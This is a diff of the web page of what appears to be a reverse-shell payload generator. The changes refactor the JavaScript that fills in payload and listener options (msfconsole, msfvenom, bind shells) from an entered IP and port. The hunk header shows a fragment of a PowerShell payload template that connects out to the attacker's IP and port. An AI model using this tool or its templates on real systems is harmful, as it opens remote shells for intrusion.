@@ -426,101 +426,68 @@ $s='${ip}:${port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f="C:Users$env
   };
 
   };
+const ipInput = document.getElementById("ip");
+const portInput = document.getElementById("port");
+const payloadTypeSelect = document.getElementById("payloadType");
+const payloadOptionSelect = document.getElementById("payloadOption");
+const listenerTypeSelect = document.getElementById("listenerType");
+const generatedPayloadArea = document.getElementById("generatedPayload");
+const generatedListenerArea = document.getElementById("generatedListener");
 
-  const ipInput = document.getElementById("ip");
-  const portInput = document.getElementById("port");
-  const payloadTypeSelect = document.getElementById("payloadType");
-  const payloadOptionSelect = document.getElementById("payloadOption");
-  const listenerTypeSelect = document.getElementById("listenerType");
-  const generatedPayloadArea = document.getElementById("generatedPayload");
-  const generatedListenerArea = document.getElementById("generatedListener");
+function updatePayloadOptions() {
+  const type = payloadTypeSelect.value;
+  payloadOptionSelect.innerHTML = "";
+  if (payloads[type]) {
+    for (let opt of Object.keys(payloads[type])) {
+      const o = document.createElement("option");
+      o.value = o.textContent = opt;
+      payloadOptionSelect.appendChild(o);
+    }
+  }
+  generate(); // regenerate payload with updated options
+}
 
-  function updatePayloadOptions() {
-    const type = payloadTypeSelect.value;
-    const options = Object.keys(payloads[type]);
-    payloadOptionSelect.innerHTML = "";
-    options.forEach((opt) => {
-      const optionElem = document.createElement("option");
-      optionElem.value = opt;
-      optionElem.textContent = opt;
-      payloadOptionSelect.appendChild(optionElem);
-    });
+function generate() {
+  const ip = ipInput.value.trim();
+  const port = portInput.value.trim();
+  const pt = payloadTypeSelect.value;
+  const po = payloadOptionSelect.value;
+  const lt = listenerTypeSelect.value;
+
+  if (!port || !payloads[pt]?.[po]) {
+    generatedPayloadArea.value = "Invalid payload selection or missing port.";
+    generatedListenerArea.value = "";
+    return;
   }
 
-  function generate() {
-    const ip = ipInput.value.trim();
-    const port = portInput.value.trim();
-    const payloadType = payloadTypeSelect.value;
-    const payloadOption = payloadOptionSelect.value;
-    const listenerType = listenerTypeSelect.value;
-
-    if (!port || !payloads[payloadType] || !payloads[payloadType][payloadOption]) {
-      generatedPayloadArea.value = "Invalid payload selection or missing port.";
-      generatedListenerArea.value = "";
-      return;
-    }
-
-    if (!ip && payloadType !== "bind" && payloadType !== "msfvenom") {
-      // For some payloads IP is needed
-      generatedPayloadArea.value = "Please enter a valid IP address.";
-      generatedListenerArea.value = "";
-      return;
-    }
-
-    const payloadFn = payloads[payloadType][payloadOption];
-    const payload = payloadFn(ip, port);
-
-    const listenerFn = listeners[listenerType];
-    if (!listenerFn) {
-      generatedListenerArea.value = "Invalid listener selection.";
-      return;
-    }
-    const listener = listenerType === "msfconsole" ? listenerFn(port, ip) : listenerFn(port);
-
-    generatedPayloadArea.value = payload;
-    generatedListenerArea.value = listener;
+  if (!ip && pt !== "bind" && pt !== "msfvenom") {
+    generatedPayloadArea.value = "Please enter an IP.";
+    generatedListenerArea.value = "";
+    return;
   }
 
-  // Update payload options on page load & when payload type changes
-  updatePayloadOptions();
-  payloadTypeSelect.addEventListener("change", () => {
-    updatePayloadOptions();
-    generate();
-  });
-  payloadOptionSelect.addEventListener("change", generate);
-  listenerTypeSelect.addEventListener("change", generate);
-  ipInput.addEventListener("input", generate);
-  portInput.addEventListener("input", generate);
+  generatedPayloadArea.value = payloads[pt][po](ip, port);
 
-  // Initial generate
-  generate();
+  const lfn = listeners[lt];
+  if (!lfn) {
+    generatedListenerArea.value = "Invalid listener.";
+    return;
+  }
+  generatedListenerArea.value = lt === "msfconsole"
+    ? lfn(port, ip)
+    : lfn(port);
+}
+
+// Set up event listeners
+payloadTypeSelect.addEventListener("change", updatePayloadOptions);
+payloadOptionSelect.addEventListener("change", generate);
+listenerTypeSelect.addEventListener("change", generate);
+ipInput.addEventListener("input", generate);
+portInput.addEventListener("input", generate);
+
+// Initialize
+updatePayloadOptions();
 </script>
-<script>
-  const payloadTypeSelect = document.getElementById('payloadType');
-  const payloadOptionSelect = document.getElementById('payloadOption');
-
-  // Populate the payload options based on selected type
-  function updatePayloadOptions() {
-    const selectedType = payloadTypeSelect.value;
-    payloadOptionSelect.innerHTML = ''; // Clear existing options
-
-    if (payloads[selectedType]) {
-      Object.keys(payloads[selectedType]).forEach(key => {
-        const option = document.createElement('option');
-        option.value = key;
-        option.textContent = key;
-        payloadOptionSelect.appendChild(option);
-      });
-    }
-  }
-
-  // Listen for changes
-  payloadTypeSelect.addEventListener('change', updatePayloadOptions);
-
-  // Initialize options on page load
-  updatePayloadOptions();
-</script>
-
 </body>
 </html>
 
